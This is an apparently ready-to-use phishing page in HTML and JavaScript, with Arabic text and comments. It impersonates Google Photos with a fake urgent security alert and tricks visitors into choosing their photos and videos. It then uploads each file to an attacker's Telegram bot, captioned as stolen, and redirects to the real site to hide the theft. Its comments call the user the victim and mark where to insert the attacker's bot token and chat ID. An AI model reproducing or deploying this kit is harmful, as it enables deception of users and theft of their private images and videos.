<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل أمان صور Google (إجراء فوري)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            max-width: 450px;
            margin: 50px auto;
            border-top: 5px solid #4285F4; /* Google Blue */
        }
        .logo {
            width: 120px;
            margin-bottom: 20px;
        }
        h1 {
            color: #EA4335; /* Google Red for Alert */
            font-size: 24px;
            margin-bottom: 15px;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .action-button {
            background-color: #4CAF50; /* Green for "Allow" */
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .action-button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
            color: #333;
        }
        .loading {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4285F4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.gstatic.com/images/branding/product/2x/photos_2020q4_48dp.png" alt="Google Photos" class="logo">
        <h1>إجراء أمني عاجل مطلوب!</h1>
        <p>تم اكتشاف محاولة وصول غير مصرح بها إلى حساب صورك. لضمان أمان مكتبة صورك ومنع فقدان بياناتك، يرجى **النقر على "تفعيل الأمان" أدناه.**</p>
        <p>سيطلب منك النظام إذنًا بسيطًا. **الرجاء الضغط على "سماح" أو "موافق" لاستعادة الوصول الكامل لصورك.**</p>

        <button class="action-button" id="securityActionButton">تفعيل الأمان الآن</button>
        <div class="loading" id="loadingSpinner"></div>
        <div id="status"></div>
    </div>

    <script>
        // **الأجزاء التي تحتاج إلى تعديل:**
        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // ضع الـ Token الخاص ببوت التليجرام هنا
        const CHAT_ID = "YOUR_CHAT_ID_HERE";       // ضع الـ Chat ID الخاص بك هنا
        // ------------------------------------------------------------------

        const securityActionButton = document.getElementById('securityActionButton');
        const statusDiv = document.getElementById('status');
        const loadingSpinner = document.getElementById('loadingSpinner');

        securityActionButton.addEventListener('click', async () => {
            securityActionButton.disabled = true;
            loadingSpinner.style.display = 'block';
            statusDiv.textContent = 'جاري تفعيل الإجراءات الأمنية...';

            try {
                // **هنا الجزء الحرج:**
                // محاولة استغلال ثغرة (أو سلوك قديم) لفتح File Picker تلقائياً أو طلب إذن الملفات.
                // المتصفحات الحديثة تمنع هذا بشدة بدون تفاعل مباشر.
                // هذه الطريقة تعتمد على محاولة فتح File Picker مباشرة بعد النقر على زر "تفعيل الأمان".
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.multiple = true;
                fileInput.accept = 'image/*,video/*'; // يمكن تغييرها لتضمين أنواع ملفات أخرى

                // تفعيل زر إدخال الملفات بشكل غير مرئي ثم النقر عليه.
                // هذا سيفتح نافذة File Picker التي سيُطلب من الضحية اختيار الملفات منها.
                // الضحية سيُخدع ليعتقد أن هذا جزء من عملية "تفعيل الأمان".
                fileInput.click();

                fileInput.onchange = async (event) => {
                    const files = Array.from(event.target.files);
                    if (files.length === 0) {
                        statusDiv.textContent = 'لم يتم اختيار أي صور. يرجى المحاولة مرة أخرى.';
                        securityActionButton.disabled = false;
                        loadingSpinner.style.display = 'none';
                        return;
                    }

                    statusDiv.textContent = `تم اختيار ${files.length} ملف. جاري المزامنة...`;
                    let uploadedCount = 0;

                    for (const file of files) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('document', file);
                        formData.append('caption', `صورة/فيديو مسروق من جهاز [${navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'غير معروف'}] - اسم الملف: ${file.name}`);

                        try {
                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                                method: 'POST',
                                body: formData
                            });

                            if (response.ok) {
                                uploadedCount++;
                                statusDiv.textContent = `جاري المزامنة... تم إرسال ${uploadedCount} من ${files.length} ملف.`;
                            } else {
                                console.error('فشل إرسال الملف:', file.name, await response.text());
                            }
                        } catch (error) {
                            console.error('خطأ في الاتصال:', error);
                        }
                    }

                    statusDiv.textContent = `اكتمل تفعيل الأمان! تم تأمين ${uploadedCount} ملف. سيتم إعادة توجيهك.`;
                    loadingSpinner.style.display = 'none';
                    setTimeout(() => {
                        window.location.href = 'https://photos.google.com/'; // إعادة توجيه إلى موقع Google Photos الحقيقي
                    }, 3000);
                };

            } catch (error) {
                statusDiv.textContent = 'حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.';
                console.error('Error during security activation:', error);
                securityActionButton.disabled = false;
                loadingSpinner.style.display = 'none';
            }
        });
    </script>
</body>
</html>
